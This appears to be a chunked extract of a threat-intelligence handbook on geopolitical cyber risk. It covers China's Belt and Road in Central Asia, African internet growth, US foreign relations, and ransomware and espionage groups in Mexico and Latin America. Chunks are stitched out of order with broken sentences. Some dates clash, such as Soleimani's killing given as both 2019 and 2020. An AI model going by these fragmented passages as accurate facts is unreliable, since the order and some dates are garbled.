Geographical zones ahead. An extensive network of transport, pipeline and telecommunication infrastructure will form the physical skeleton of a future Eurasian “economic corridor”. This network will link China to Western Europe by land via Central Asia, Asia Minor, the Persian Gulf, the Caucasus and the Balkans. It will also link them by sea via the South China Sea, the Indian Ocean and the Persian Gulf through to the Mediterranean. The $50 billion Asian Infrastructure Investment Bank (AIIB) and the $40 billion Silk Road Fund were set up by Xi Jinping to inject investment into regional infrastructure. Despite the altruistic rhetoric, Beijing is responding to national priorities and serving primarily Chinese economic, political and strategic interests. While based on the historic aura of the ancient road that linked the Chinese and Roman empires, the objectives of these “new silk roads” are adapted to serve contemporary geopolitical needs. Central Asia is a key part of the original New Silk Roads project, which aimed to promote the construction of transport infrastructure between China and Europe. Xi Jinping’s speech announcing the launch of the Silk Road Economic Belt was made in Astana (renamed Nur-Sultan on 23 March 2019), Kazakhstan. The imagery of the Silk Roads is especially resonant in this part of the world, which was at the heart of the trade flows between Europe, the Middle East and the Chinese Empire prior to the 15th century."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|23f772b0498844588917859d098a55fc
Of the six “economic corridors” in the new Belt and Road Initiative (BRI), two directly concern Central Asia: the New Eurasian Land Bridge (China, Kazakhstan, Russia, Belarus, Poland, Germany) and the China-Central Asia-West Asia Economic Corridor (China, Kazakhstan, Kyrgyzstan, Tajikistan, Uzbekistan, Turkmenistan, Iran, Turkey). In spite of having become the first trading partner for central Asia countries, China’s interest in its neighbouring region to the west is not only based on an economic vision. For the Chinese central government, helping stabilise and develop the countries on its western front is a way to avoid instability at the gates of its western Xinjiang region. This region, considered unstable by Beijing, is mainly populated by ethnic Uyghurs2. Security coo20|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|43473f23dd084f7fa536b0b5fc2d082a
peration between China and Central Asia is largely centred around the Uyghur question and the fight against the “three scourges” identified by the Shanghai Cooperation Organisation (SCO): terrorism, separatism and religious extremism. In the years ahead, Russia’s reactions to China’s growing presence in its historic area of influence will be closely watched. For Russia, the BRI certainly comes with advantages, such as investment capacities that it cannot offer its partners and that will help improve infrastructures and make trade within the EAEU more seamless. Launched in 2015, it does not challenge Russia’s monopoly on political-security issues in Central Asia — at least for now — and it supports institutional recognition of the EAEU as a credible and legitimate regional organisation3. Nonetheless, China’s security presence could be strengthened in the medium or long term with the expansion of Chinese economic interests in the zone, as can be seen in Tajikistan4.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|3f239aa944b448148ecfa4b087babef3
"_LOOKING AT THE MAJOR ATTACKERS WHO HAVE TARGETED THE REGION, WE QUICKLY SEE THAT THE GEOPOLITICAL CONTEXT HAS A SIGNIFICANT IMPACT ON THE NATURE AND STRUCTURE OF THE CYBERTHREAT. The cyber continuity of the Chinese Silk Road initiative is rendered essential by the need to secure sea and land routes. Among the 360 cyberattack campaigns observed since the birth of the project, one can notice the presence of high-intensity actors with allegedly close ties to Chinese authorities. The ATK15 (Emissary Panda) group launched campaigns between fall 2017 and March 2018 targeting a Central Asian data center. The use of a compromised router (RouterOS Mikrokit) allowed the attacker group to access government resources. While the beginnings of ATK 15 date back to 2009, its recent activity reflects China’s need to secure land and sea routes to Europe. Nevertheless, while Central Asian countries and Russia seem relatively unaffected by the massive and repeated attacks that other countries in the region (India in particular) may suffer, several indicators tend to show a reversal of this logic with the spectre of direct attacks on strategic infrastructures in Central Asia or Russia. Other active hackers in the region such as ATK23 (Icefog) and ATK147 (Poison Carp) have targeted Uyghur and Tibetan minorities in particular.

Conclusion We have observed that the countries of the Commonwealth of Independent States, which were formerly Soviet republics5, share two main characteristics. First, they have a high risk of internal instability (within each country and across the broader regions), notably due to the emergence of separatist movements in the Caucasus. In addition, they are strate-

gically important, because their geographic location fuel the geopolitical appetites of neighbouring powers. The Caucasus is an interface between Continental Europe and East Asia. Central Asia, the heart of Eurasia, is at the crossroads of Russian, Chinese, Iranian and Western (NATO) influences. This second feature, shared by the two zones and their res-

pective countries, is leading the world’s major powers to project their influence on these territories, even if it means taking advantage of or stirring up potential internally destabilising factors

an even faster rate. In addition, the increase in the median age by just over five years, coupled with the increase in per capita living standards by 2050, will also lead to a diversification and increase in the use of digital media. Inevitably, the higher Internet penetration rate will spell an upsurge in the number of interconnections and, as a result, a greater vulnerability and threat surface.

_INTERNET PENETRATION To understand the cyberthreat in Africa, one of the most significant contextual trends is the exponential growth of Internet penetration in the various countries. From 2000 to 2021, the African population increased by almost 68%, from 817.67 million in 2000 to 1,373.49 million in 2021. Over the same period, the number of Internet users rose from 4.51 million to 590.3 million, an increase of 12,988.7% 1,2,3,4,5. In 2021, Internet penetration in Africa extended to 43% of the population, or almost one in two people. This figure is 78 times higher than 20 years ago. Africa today is modern and connected.

"_OPPORTUNITIES AND

CHALLENGES

The contextual issue for understanding the cyberthreat in Africa is not simply the exponential increase in digital technology across the continent. In reality, the problem also lies in the imbalance between this increase and the status of cybersecurity and cyberdefence in the societies concerned. _LACK OF CYBER EXPERTS This imbalance is mainly due to three co-constituent factors. First, it is a human problem, which does not only concern the African continent. In Africa, an additional 100,000 cybersecurity experts are needed in order to respond to the current challenges15. And the trends we have discussed will further increase this need.

_POOR VISIBILITY OF THE NUMBER OF SECURITY INCIDENTS There is also a cultural issue in cybersecurity in terms of reporting and fixing security incidents. Some 96%16 of incidents are not reported or resolved, which means that the level of cyberthreat in Africa is likely to be much higher than we know. _LEGAL AND STRATEGIC ARMOURY UNDER CONSTRUCTION Most African countries have not yet, or have not sufficiently, structured their legal armoury to deal with the cyberthreat. In 2016, it was estimated that over 40 countries across the entire continent had not or had only partially implemented specific legal provisions to address the challenges of cybercrime and oversee the gathering of electronic evidence17. It should also be noted that only 15 African countries have a national cybersecurity strategy in place18."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|230f58b9a85c46a2b9e80049d40f06bd
"Conclusion Africa is destined to become one of the geographic parts of the world where the cyber issue will be the most decisive factor for the future of societies and organisations. Already, the continent’s colossal trends are fuelling a strategically important yet unsuspected cyberthreat. These trends include the exponentially increasing Internet penetration across society and industry (up 12,988.7% in 20 years), the de-

mographic structure of these societies (1.2 billion people under 25 by 2050) and the rapidly growing popularity of digital tools. At the same time, 96% of security incidents are unknown or unreported and decisive attacks are already affecting the continent, as we have seen in Ethiopia, South Africa and Liberia. These trends will obviously continue to create huge issues

and challenges, yet a mismatch is already apparent when we consider the structure of cybersecurity and cyberdefence across the continent. Three challenges need to be met, namely the training of the population to create cyber experts, the visibility of incidents and a clearly defined legal and strategic framework to address the cyberthreat."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|0c2c152597de4653a36ad058ea22618b

_US FOREIGN POLICY HAVE HAD SIGNIFICANT CONSEQUENCES ON THE CYBERTHREAT LANDSCAPE.

Contextual analysis of North America and geocyber risks The Americas can be divided into three geographic regions: North America, which includes the United States, Canada and Mexico; Central America; and South America. This hemisphere is marked by its cultural contrasts and, in particular, by its economic diversity. The United States and Canada are rich and developed, while other countries in the region are considered to be emergent or low-income economies. The Americas are beset by many geopolitical tensions taking the form of border conflicts

between countries or even social conflicts within them. The role of the United States, sometimes described as dominant, is often cited as the cause. More accurately, dominance on the continent can be described as being shared between the United States and Canada, the region’s two most developed nations. This creates a geoeconomic contrast on the continent as a whole, as these two countries constitute one of the three major poles of the world economy. Indeed, in 2015, the GDP of the United States was"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|c2bbe43c2e074241ba52d186ed7c44a5
"$18,036 billion, the highest in the world. Canada’s was $1,550 billion, placing it in tenth. These countries have diversified economies that are extremely well-integrated into global trade. The United States is home to many of the largest multinational corporations and several global cities, chief among which is New York. However, such disparities and issues of hegemony can exacerbate international tensions, fostering an environment of heightened geopolitical cyberthreats.

_ONGOING INTERNATIONAL

TENSIONS IN NORTH AMERICA

Prime Minister Justin Trudeau and Mexican President Enrique Peña Nieto have frequently remarked on their disagreements with President Trump, while remaining clear that they wish to continue their cooperation with the world’s leading economy. During his term, President Trump oriented its foreign policy towards a strengthening of bilateral relationships with Russia, Iran, and even China.

nefits from the hostility that exists between the two countries. However, the US hardly revels in the ongoing tensions, and does not appear to profit from them, not least because as Russia grows more distant from other European countries and US, it is becoming increasingly dependent on its relations with China and less inclined towards mitigating the increasing asymmetry between these powers."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|d83c1f6052934d0ba119a63aa700e16d
"Since the end of the Second World War – and, more to the point, since the Bretton Woods agreement in 1944 – the United States has remained at the top of the international order. _THE US AND CHANGING FOREIGN POLICIES IN THE ERA OF “AMERICA FIRST” Canada, Mexico and the rest of the world have had to significantly amend their foreign policies over the last several years, under pressure during Donald Trump’s term as President of the United States from 2017 to 2021. FOREIGN RELATIONS OF NORTH AMERICAN NATIONS The leaders of Canada and Mexico, along with foreign ministries from other nations around the world, have adjusted their foreign policies either in the US’s favour or to turn away from it. For example, Canadian 30

RUSSIA–US RELATIONS The power balance between the United States and these three nations was a touchstone of Trump’s tenure, and continues to be so under Biden, albeit with less emphasis on Russia. On Russia specifically, some observers of Russia–US relations, particularly pro-Kremlin Europeans, have claimed that Vladimir Putin is an “ideal” or “useful” enemy for America. They imply that the US is almost entirely responsible for its tense, fragile relationship with Putin’s Russia, or even that it be-"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|f792c5171ce5486eb5c3088dd94f7b7e
IRAN–US RELATIONS Relations between the US and Iran have become yet more precarious. Indeed, the recent spike in tensions starting in early 2019 is part of a broader trend of escalating diplomatic disagreements between the two countries. Already fraught after the US’s withdrawal from the Iran nuclear deal (JCPOA) in May 2018, Iran–US relations have degraded even further, especially since the Trump administration added the Revolutionary Guards to its list of terrorist organisations in April 2019 and tightened its sanctions against Tehran the following month. In|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|2936b01abd5b49908efd74f5f0c22b7c
2020, relations between these two countries were aggravated yet further with the killing of the Iranian General Qassem Soleimani, the Islamic Republic’s representative in Iraq and head of the Quds Force, in an American raid in Baghdad on 3 January 2020. Despite an Iranian retaliation in the form of several missile strikes on US bases in Iraq, tensions have begun to soften as the two sides seek some level of stability. CHINA–US RELATIONS In recent years, relations between China and the United States have been beset by several geopolitical events that have strained the limits of diplomacy between the two countries. For example, in 2020, the US accused China at length of data theft and widespread espionage, leading to the closure of the Chinese consulate in Houston, Texas. The US Secretary of State justified these steps as being for the protection of US intellectual property and the personal information of individual Americans. Mike Pompeo|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|f7236d5e9c174939a0876122f912aa66
also described the Chinese consulate in Houston as having been a hub for espionage. Moreover, two Chinese nationals were charged by a US court with computer hacking offences for allegedly stealing data from a company working on a Covid-19 vaccine. However, the closure of the Houston consulate in particular was all the more symbolic as it was the PRC’s first in the United States, having opened in 1979 with the reestablishment of diplomatic relations between the two powers. China viewed the closure as a step too far, declaring it an outrageous, unjustified and unilateral provocation by the US. Beijing retaliated by ordering the closure of the US consulate in Chengdu, in central China, on 24 July 2020. In a press release, the Chinese foreign minister described this as a “legitimate and necessary response to the unreasonable measures taken by the United States”.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|e0b34ce60222454893dde55c569be8dd
The threat represented by Russia has been compounded by a marked increase in the number and severity of attacks since 2019. In cyberespionage, the SolarWinds attack (December 2020) demonstrated the danger posed by attacks from state-sponsored groups. This supply chain breach had a particularly serious impact because, rather than directly targeting the federal government or a private company’s network, the perpetrators attacked a third-party software supplier serving these entities. The target was an IT management platform called Orion, a product of Texas-based company SolarWinds. More than 33,000 businesses used Orion. According to SolarWinds, 18,000 of its clients were affected, including 425 Fortune 500 companies. This heightened threat is also exemplified by the ransomware attack conducted by ATK168 using REvil, also known as Sodinokibi. The attack on software company Kaseya by the REvil ransomware operation is considered the largest ever such attack by a cybercriminal group. While 2017’s three ransomware attacks (WannaCry, NotPetya and Bad Rabbit) were larger, they were linked to state-sponsored actors rather than groups with financial motives. According to cybersecurity researchers at Symantec, some vague indications point to political motives behind the attack.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|29a00f141ba04b8f862e766274c2d04f
"The US has not explicitly linked the REvil attacks to the Kremlin, but President Joe Biden has nevertheless warned his Russian counterpart that the latter’s government must act against such criminal organisations, and that US authorities would do so if necessary. In January 2021, several members of REvil were arrested by Russian authorities obeying to a US demand. While it may appear as the reinforcement of collaboration between the two countries, the timing of this announcement raises questions as several Ukrainian government sites Cyber Threat Handbook |

Geographical zones were targeted by a cyberattack and Russian troops are massed at the border. Likewise, the largest oil pipeline of the US, Colonial Pipeline, fell victim to the RaaS (Ransomware-asa-Service), forcing the company to temporarily shut down its activity. The incident, which happened on May 7, 2021, affected the delivery of gas in Southern states, provoking shortages at gas pumps. Former US President Donald Trump was also the target of several influence campaigns. These attacks appeared to originate from groups operating in China, including ATK213 (also known as APT31). This group carried out more than 150 breaches over the course of six months. In 2020, Trump called for the social media platform Tik Tok to be banned in the United States, on the basis that the data collected through the app was disseminated to the Chinese government. This ban provoked many Chinese actors to carry out influence campaigns aimed at destabilising the US elections by sowing disinformation about the President to sway voters.

_THREATS ARE ALSO EMERGING FROM OUTSIDE OF CHINA. After months of heightened tensions between the US and Iran, there were fears that this could have been used as justification for an attempt to destabilise the US election. After Trump withdrew the US from the JCPoA in May 2018 and Iranian general Qassem Soleimani was killed on Iraqi soil in January 2019, the risk of cyberespionage or more conventional attacks (such as phishing or ransomware campaigns) aiming to destabilise the then-US President became markedly more significant. In May and June 2020, this fear was realised in the form of an attack by the group Phosphorus, which gained access to several accounts belonging to members of the administration, Trump campaign staff and others involved in the 2020 presidential election. Twitter announced that it had deleted around 130 Iran-based accounts that had disrupted the public conversation on the platform during

the first campaign debate between Biden and Trump. This also illustrated a shift in technique as attackers targeted the two candidates directly and the electoral process itself. It is becoming more and more difficult to predict this type of realtime attack and proactively analyse the threat landscape to prevent them.

Many of these disinformation campaigns have responded to significant events such as the January 2017 massacre at a Quebec City mosque or the June 2019 approval of the Trans Mountain pipeline.

_CANADA AND TRANSATLANTIC RELATIONS In recent years, countries have strengthened their diplomatic and economic links with Canada as, since 2017, the US has drifted further towards protectionism. The US’s decision to heavily tax steel and aluminium imports had been extremely damaging to Canada and the member states of the European Union. The move even provoked threats of retaliation from the EU, Canada and Mexico. In May 2018, Canadian Prime Minister Justin Trudeau publicly declared his disap-"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|f4cc1416597e440d80a8cd8d6ce4d408
proval and, along with policymakers in European countries, claimed that the President’s invocation of the national security defence, referring to WTO regulations, did not hold water. It is therefore unsurprising to see Canada looking to the nations of the Old Continent for less protectionist economic partners, more open to diplomatic relations. This transition took a significant step forward with the signing of the Comprehensive Economic and Trade Agreement (CETA) between Canada and the EU in autumn 2016. The goal of this agreement was to ease the export of Canadian products to the European market by almost completely eliminating tariff and non-tariff barriers, while creating a more stable investment context for Canadian and European businesses. Prime Minister Trudeau and French President Emmanuel Macron portrayed this bolstered Canada– France relationship as favouring a just, fair and rules-based international order. Canada and France have instituted structural frameworks for their joint activities, particularly in the areas of culture, the environment, development aid, sustainable development, artificial intelligence and defence. The two countries have committed to a joint meeting of their cabinets with the goal of building further institutional ties.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|d73562536a0e47b1b08a4ff8e8d47b7d
_IN CANADA, THE CYBERTHREAT ENVIRONMENT IS CONSTANTLY CHANGING AS BAD ACTORS CONTINUE TO ADJUST THEIR STRATEGIES. As Canadians adopt new technologies and Internet-connected devices, it is certain that new threats will arise. Furthermore, Canada’s rapprochement with Europe may create a major risk from adversary foreign powers. The Covid-19 pandemic has had a significant impact on the cyberthreat landscape in Canada. In 2019, the medical laboratory company LifeLabs fell victim to a cyberattack which compromised the personal and medical data of 15 million Canadians. The company finally paid the ransom to recover this data. Geopolitical events such as the warming of relations between Canada and the EU can also make cyberattacks more likely. For instance, activists such as environmentalists might aim to weaken CETA, as the agreement eases the process of importing polluting fuels and GMO foodstuffs. This was observed in 2017 and 2019 when Twitter data revealed that Russian and Iranian trolls had been posting to the site using fraudulent accounts. The purpose of this activity was to exacerbate divisions among Canadians and provoke conflict by widening the reach of inflammatory content on political issues like terrorism, climate change, pipeline construction, immigration policy and refugees.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|9ac17356eec9404694e3ff5d4646dae0
Although Mexico is a multiparty democracy, power remains concentrated in the hands of the Institutional Revolutionary Party (PRI), which controlled both chambers of Congress and the presidency continuously from the Second World War until 2018. Despite persistent inequalities, the country’s industrial sector has seen a meteoric rise since the war. Large oil reserves, exploited by a state-owned corporation, have contributed to Mexico’s economic stability, which had been shaken by plummeting prices during the 1980s. However, Mexico’s ambition to become a major power on the international stage (and within North America in particular) is hampered by several factors, including crime and immigration, which remains an issue to this day. _CRIME IN MEXICO Mexican drug-trafficking cartels are among the most developed organised crime rings in the world. While fragmentation has reduced the number of such groups with large international operations, those which remain have access to networks covering most of the Americas, even extending into Europe and Asia. These international cartels interact with foreign actors but generally lack a strong grounding in Mexico. Their activities more often take the form of joint ventures with other Mexican groups. These organisations focus on international drug trafficking, which brings in millions of dollars in revenue every year, but also engage in other activities such as oil theft, illegal logging, human trafficking, kidnapping and extortion.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|75d3cf17d9654ca9a73005b5c997fe46

mon. Drug cartels control large tracts of territory throughout Mexico, supplanting government authority by means of bribery and intimidation to facilitate illicit activities and skew the democratic process. Politicians are frequently assassinated or threatened by organised crime groups, who ensure that public positions are filled by cooperative individuals. In addition, the fragmentation of cartels has produced smaller offshoot groups with no permanent power structure, which pose a security threat as turf wars become more common and localised. These groups generally lack access to the necessary resources to manage transnational drug trafficking networks and favour activities such as extortion, kidnapping, vehicle theft, oil smuggling, human trafficking and smuggling, wholesale drug dealing and illegal mining. They play a key role in the drug trafficking supply chain, handling local transport and security within wider networks. While state actors do not control criminal markets, corruption within the government and agencies responsible for law enforcement enables criminal networks and shapes illicit activities, constituting a stream of income for highranking public officials.

_ORGANISED CYBERCRIME IN MEXICO POSES A GROWING THREAT TO CIVILIANS AS WELL AS PUBLIC AND PRIVATE ORGANISATIONS As crime increases, the eyes of the cybersecurity world have turned towards the country. In fact, Mexico has suffered more cyberattacks than any other Latin American country besides Brazil. In both countries, emails containing links to malicious websites are fairly common. Some of these websites are believed to be among the most prolific generators of spam in the world. Symantec placed Mexico among the 10 countries most affected by email phishing scams. Mexico was ranked seventh, after Ireland, Australia, New Zealand, Brazil, Norway and the UK. The last few years have seen many criminal cyberattacks hit the country. For example, sites belonging to the Lotería Nacional y Pronósticos, the national lottery, were rendered inaccessible to visitors outside of Mexico after being targeted using Avaddon ransomware. Avaddon is found throughout the world and spreads using emails styled as love letters. It appears to have been distributed by the botnet Trik (also known as Phorpiex) since early June 2020. Avaddon’s operators launched a data leak site"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|bdf1991c86e84b888762878bafca211f
"to extort victims in August of that year. In conducting their activities, the group observed the so-called 5×5 rule, wherein the starting price in negotiations is placed at 5% of the victim’s annual revenue, which is estimated at a fifth of total revenue. Cybersecurity researchers at Advanced Intel estimate Avaddon’s total revenue at $87 million before it ceased operations in June 2021. Furthermore, attackers are increasingly using malware capable of paralysing a whole set of systems, including supply chains, manufacturing and payments, removing the malware only after receiving substantial sums of money. One notable example was the case of Pemex, the Mexican state oil company, which was targeted using the ransomware Ryuk. Ryuk generally targets businesses with revenue between $500 million and $1 billion. Although operations appeared to continue as normal and petroleum production and storage were not affected, this attack against critical infrastructure demonstrates the severity of the cyberthreat facing Mexico.

Contextual analysis of Latin America and geocyber risks 17 July 1979 remains a pivotal date in the history of South American geopolitics. A military junta seized power in Managua, Nicaragua’s capital, triggering a civil war that engulfed the country. The so-called Sandinista revolution marked the start of more than 10 years of civil war in Latin America. Geopolitical tensions abound in the Americas, fuelled by border conflicts between countries or social conflicts within them, as well as the dominant role of the United States. Central and South America are regions beset by perennial and long-standing conflicts. In Central America, the Sandinista re-"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|e9d7d78351e5420eb1a49c3f612331cc
"_DEEP-ROOTED TENSIONS IN CENTRAL AND SOUTH AMERICA In recent decades, urban conflicts have erupted throughout Latin America in response to several phenomena including poverty and rising inequality. As for international clashes, several Central and South American countries have been in conflict for many years. Meanwhile, the same countries are often plagued by internal tensions, as populations searching for a new socio-economic order make their grievances known through a variety of protest movements. _ECONOMIC MODELS IN LATIN AMERICAN COUNTRIES Boosted by growth in the early 2000s thanks to sluggishness in the US, South America has seen some economic success. Brazil, for example, is one of the five emer-

volution against the US-backed dictatorship in Nicaragua in the 1970s marked the beginning of a decade of strife. In South America, some tensions are rooted in national borders drawn during the post-colonial period. The wounds of the War of the Pacific, in which Bolivia lost its only province with access to the sea to Chile, remain raw for many Bolivians. The repercussions of this animosity are still being felt as Bolivia refuses to provide energy resources to Chile. Since the end of the 2000s, there have also been significant tensions between Colombia and Venezuela."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|07e6dc53bd3842c49c081424193ea868
"gent economies known as the BRICS countries. However, since 2011, this growth has been merely relative, and most Latin American countries have slid into recession. In fact, after a “golden decade” between 2003 and 2013, during which economies boomed and inequalities narrowed, Latin America’s GDP (Gross Domestic Products) per capita had collapsed to 2010 levels by the end of 2020. The price of exported primary commodities has weighed heavily on countries’ financial capacities as well as their economic growth. The fossil fuels sector has also been a factor in this crisis: in 2014, oil prices plummeted in Argentina, Brazil and Venezuela. _REGIONAL DIVISIONS STOKING BORDER CONFLICTS Border conflicts in this region are nothing new. For hundreds of years, Latin America has been the setting

Despite these ongoing strains, the continent is becoming more and more integrated. Human and capital flows are on the rise, albeit oriented towards the US. In North America, the USMCA (United-States, Mexico, Canada Agree has established an area where capital and goods circulate freely. Its equivalent in the South is MERCOSUR. The region’s troubled internal relations may give rise to groups of attackers aiming to take advantage of its geopolitical instability and set off an explosion of cybercrime within the region and beyond."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|c0a40c378e164a36aeae021cb0838cb4
"for several international conflicts, with some still ongoing that stretch back to the 19th century. Today, political disagreements between countries continue for a variety of reasons, including various permutations of nationalism and conflicts of economic interest. These battles are fought in the raw materials sector, particularly oil and gas, as well as within the framework of increasingly fragile regional alliances. On 1 May 2006, Evo Morales nationalised Bolivia’s oil wells, hitting Brazilian company Petrobras (a third of whose shares are owned by the Brazilian government) particularly hard and impacting other foreign companies including Spain’s Repsol. In response to objections by Brazil, backed by Argentina, Bolivia gained the support of Venezuela, resulting in a temporary schism between the region’s left-wing governments.

tions (UNASUR) is now moribund. In 2018, six of its 12 members announced their temporary withdrawal from the union and suspended their financial contributions in response to the organisation’s collective inability to designate a new secretary general to succeed the former president of Colombia. This institutional breakdown is the result of these countries’ shift towards nationalism and prioritisation of their own economic interests, which has aggravated regional divisions and conflicts between countries. Their inward turn is hardly surprising, as many of them had endured or continue to endure deep economic, political and social crises. These situations dampen the driving force that motivates earnest cooperation and regional projection, instead favouring policy focused on the internal welfare of the nation. _FOREIGN POWERS CAN TAKE ADVANTAGE OF DETERIORATING REGIONAL UNITY THROUGH ESPIONAGE ACTIVITIES This was the case with ATK97, known as “El Machete”, a cyberespionage group that has been active since 2010. Its agents usually target the governmental and military sectors in Latin America as well as the US, Korea and several European countries. The source code of the group’s malware, which it usually deploys in sophisticated spear phishing attacks, suggest that the developers are Spanish speakers. The question of potential sponsorship of the attacking group by a foreign power remains unresolved."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|3f290e468f254619b475c98a25bd1598
"Most of the victims of the group’s 2010 campaign of attacks were in countries such as Venezuela, Ecuador, Colombia, Peru and Cuba. Finally, it is interesting to note the large number of countries around the world that target this region with cyberattacks. In February 2021, of the ten main countries from which attacks targeting Brazil, Chile, Colombia and Panama originated, China was the source of 23,583 attacks, Germany 10,847 and the US 10,019. _INTERNAL CONFLICTS The social and political consequences of the economic crisis of the 2020s have weakened Latin

Geographical zones cess to a copper mine and forced it to halt production. In most countries, protests were caused by political decisions that may seem insignificant. However, such decisions can exacerbate inequalities, increase tension in society and sometimes result in a violent backlash by the population. This was the case in Chile, in 2019, where a political decision was made to increase ticket prices on the Santiago Metro. This was merely a catalyst for a much broader protest movement challenging the Chilean economic model and spotlighting the

country’s inequalities. Surging poverty and inequality, deteriorating public services and wage stagnation, combined with ever-increasing precarity and unemployment, have laid bare widespread dissatisfaction and defiance towards elites and governments.

"mining the legitimacy of political systems and institutions as the public discovers their extent. The Odebrecht case embodies the current situation with regard to corruption. Some 10 countries have been impacted by the scandal, which led to the downfall of Peruvian president Pedro Pablo Kuczynski. All of these factors have coalesced to breed discontentment within Latin American societies and foster a feeling of insecurity. Rising crime, whether tangible or virtual, has made the region one of the most dangerous in the world. Latin America is home to 40 of

the 44 cities where criminal activity poses the most severe threat. For instance, El Salvador, Honduras and Guatemala have the highest homicide rates in the world. Much of this urban violence is perpetrated by gangs, specialized in drug trafficking. Indeed, due to its geography, Latin America is an active participant in the drug trade, notably providing the US with co-"|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|a0211238e6424f08bdeb7eccbcc4ded9
caine. Figures show that 80% of cocaine arriving in the country transits through Central America. This lucrative and straightforward business has led to the formation of thousands of small, violent gangs across the region (including maras, Mexican cartels and Brazilian mafia organisations). Law enforcement and politicians are often powerless to stop them, and the rot is often worsened by corruption and public officials accepting bribes. _LATIN AMERICA’S INSTABILITY HAS LED TO WIDESPREAD PRECARITY, OPENING THE DOOR FOR CYBERCRIMINALS TO CONDUCT VARIOUS TYPES OF ATTACK CAMPAIGNS BOTH WITHIN THE REGION AND AROUND THE WORLD These groups include ATK237, also known as the Tetrade. This malware family, of Brazilian origin, is characteristic of the country’s cybercrime landscape. Until 2011, it primarily targeted Brazilian victims, before expanding its focus worldwide. It comprises four malware families called GUILDMA (aka Astaroth), GRANDOREIRO, JAVALI (aka Osaban) and MELCOZ. Cybersecurity researchers from Kaspersky Lab identified this series of malware as being responsible for attacks on financial institutions in Brazil, other Latin American countries and Europe. The Brazilian cybercriminal underground is known to be particularly geared towards the development and sale of banking trojans. Finally, the group ATK243 (aka Carbanak or Anunak) is worth highlighting in order to demonstrate cybercrime’s important place in this part of the world.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|140015f810ff4348ae43d2eaec3878b2
The ATK243 label was assigned to resolve confusion between the aliases FIN7 and Carbanak/Anunak, two groups which are tracked as a united operation. Their common feature is the use of the malware Carbanak. Note that, despite its shared interests with ATK32, ATK243 is a separate group. ATK243 was first identified in 2013. Since then, they have attempted to attack up to 100 banks, electronic payment systems and other financial institutions in around 30 countries, including Brazil. According to data from Kaspersky Lab, Cabarnak’s targets include financial institutions in Russia, the US, Germany, China,|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|a91676e5d00a4f93a6e880031c6bf184

The early stages of the epidemic were characterised by uncertainty, as the region was initially only marginally affected. However, Latin America quickly became the hardest-hit region in the world (and remained so until October 2020, when the changing seasons put Europe back in the lead), representing more than a quarter of the planet’s cases and a third of its deaths with just 9% of its population. The Covid death toll in Brazil has exceeded 600,000, making it the country with the second-most deaths after the United States. Mexico, Peru, Colombia and Argentina had the highest mortality rates after Brazil. In October 2021, Brazil was continuing to suffer heavily, with the hi-|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|5ffcfc2f6f09429c917b3427956f6ab8
"Consequently, several indicators have shown that Latin America is on the verge of a major economic crisis due to Covid-19 in the medium term. Countries in the region lack resources, continue to fall deeper into debt and remain dependent on raw materials exports to regions in crisis, currently including China and Europe. The Economic Commission for Latin America and the Caribbean estimates that the pandemic will cause the region’s economy to shrink by 5.3%, with 29 million falling into poverty. South America will not return to its already poor pre-Covid status quo until 2023 at best, and possibly not until 2030. _THE INSTABILITY CAUSED BY COVID-19 IS EXPECTED TO LEAD TO MANY ATTACK CAMPAIGNS AGAINST LATIN AMERICAN COUNTRIES, PARTICULARLY BRAZIL

ghest daily number of cases in the region. Despite improvement, epidemics have afflicted Latin America for decades, and the region accounts for a disproportionate share of health and economic costs as a result. These challenges are compounded by rising hunger, economic hardship, widening inequalities and a rapidly approaching hurricane season. Hunger and food insecurity have the potential to generate widespread conflict, provoke political turbulence and force vulnerable families to flee."|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|e1789711baf344879188fb8d3c698ba8
rise in brute force attacks due to the increase in remote working. For instance, the infamous ransomware REvil, also known as Sodinokibi, was one of the first to take advantage of the pandemic to launch attack campaigns. In July 2020, REvil’s operators (ATK168) demanded a ransom of $14 million from Brazilian electricity provider Light SA. In 2021, Centrais Eletricas Brasileiras (Eletrobras) and the Companhia Paranaense de Energia (Copel), two major public electricity providers, announced that they had suffered ransomware attacks in the last week. In Copel’s case, the attack was the work of the Darkside ransomware gang, who claim to have stolen more than 1,000GB of data including sensitive infrastructure access information and the personal details of top management and customers. The attack on Eletrobras affected servers on the company’s administrative network and had no impact on the operations of nuclear power stations Angra 1 and Angra 2.|data_input/Oilrig_reports/entry_f09a0ea2-066d-4992-9586-97ae27f2447d.text|77d2e2a22b85496bbeafeae3b4bc6d23
